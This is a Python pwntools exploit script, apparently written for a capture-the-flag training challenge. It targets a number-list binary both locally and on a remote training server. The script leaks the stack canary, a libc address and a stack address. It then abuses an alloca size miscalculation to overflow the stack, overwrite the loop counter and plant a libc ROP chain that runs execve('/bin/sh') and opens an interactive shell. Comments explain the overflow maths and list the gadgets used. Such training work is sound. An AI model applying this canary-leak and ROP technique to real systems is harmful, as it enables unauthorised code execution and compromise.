from pwn import *

# alloca(n & 0xfff) => at most 0xfff = 4095 Bytes
# n = 16 * ((4*size + 23) / 16) > 4095
# => (4*size + 23) / 16 > 256
# =>  size/4 + 1 > 256
# => size >= 1020
# => with size = 1027 we would overwrite the srip, but to avoid page segmentation we can insert at most 500 numbers (0x1000 - 0x60 Bytes)
# See file delta_maximizer.py for overflow explanation.
# Apparently, instruction at virtual address 0x13A9 causes the reset of the counter because it pushes rax overflowing into the counter location with the most significat 4 Bytes, so if they are 0, the counter gets overwritten with 0
# => at iteration i, given by the magic fomula for n slots, we have to insert i<<32 to make the cycle go on unchanged
# => all we said about #slots > 0x1000 doesn't count anymore.
# It's impossible to use this executable gadgets because it's full RELRO, and apparently, we cannot jump to the libc6 onegadgets, so trying to perform a libc6 ropchain (see file .../odc/env/libc6gadgets.txt).

LIBC = ELF('../../env/libc.so.6', checksec=False)
exe = './positive_leak_patch'
binsh = int.from_bytes(b'/bin/sh\x00', 'little')
COMMANDS = '''
brva 0x12B2
brva 0x1302
brva 0x13DF
brva 0x145A
c
'''

def add_numbers(c:tube, n:int, nums:list[int]):
    c.recvuntil(b'> ')
    c.sendline(b'0')
    c.recvuntil(b'> ')
    c.sendline(str(n).encode('utf-8'))

    for i in nums:
        c.recvuntil(b'#> ')
        c.sendline(str(i).encode('utf-8'))
        # print(f'{i} ({hex(i)}) sent')

while True:
    if args.REMOTE:
        c = remote('positive-leak.training.offensivedefensive.it', 8080, ssl=True)
    elif args.GDB:
        c = gdb.debug(exe, gdbscript=COMMANDS)
    else:
        c = process(exe)

    # Leaking stack and libc addresse and canary
    add_numbers(c, 7, [0, 0, 0, -1])    # [rsp-(6*8)+(3*8)]: canary copy
    add_numbers(c, 7, [0, -1])          # [rsp-(6*8)+(1*8)]: libc
    add_numbers(c, 2, [-1])             # [rsp-(6*8)]: address on stack

    c.recvuntil(b'> ')
    c.sendline(b'1')
    stack_leak = c.recvline(keepends=False).decode('utf-8')
    libc_leak = c.recvline(keepends=False).decode('utf-8')
    c.recvline()
    canary = c.recvline(keepends=False).decode('utf-8')
    stack_leak = int(stack_leak)
    LIBC.address = int(libc_leak) - 0x87DCA     # 0x7e307d087dca - 0x7e307d000000
    canary = int(canary)

    # If canary < 0 (>0x8000 0000 0000 0000) the int conversion gives problems, better to just void them and retry
    if canary > 0:
        break

    print(f'Negative Canary ({canary})')
    c.close()

print(f'Stack leak: {hex(stack_leak)}')
print(f'Libc base: {hex(LIBC.address)}')
print(f'Canary leak: {hex(canary)}')

ropchain = [
canary, 
binsh,
LIBC.address + 0x10f75b,
stack_leak,
LIBC.address + 0x110a4d,
0,
LIBC.address + 0xb5d9c + 4,
LIBC.address + 0xeef33 + 1,
-1
]

# BOF
# With #slots = 30, we make the program allocate only 16 slots, so we have 14 quadwords of overflow
overflow = [0 for i in range(17)]
overflow.append(20<<32)       # overwriting i to jump directly to the canary
overflow.extend(ropchain)
add_numbers(c, 30, overflow)

c.interactive()

# Useful libc6 gadgets:
# 0x10f75b: pop rdi; ret;
# 0x1afc86: pop rsi; add eax, 0x2685c; ret;
# 0x110a4d: pop rsi; ret;
# 0xb5d9c + 4: xor edx, edx; mov eax, edx; ret;
# 0xeef33 + 1: mov eax, 0x3b; syscall;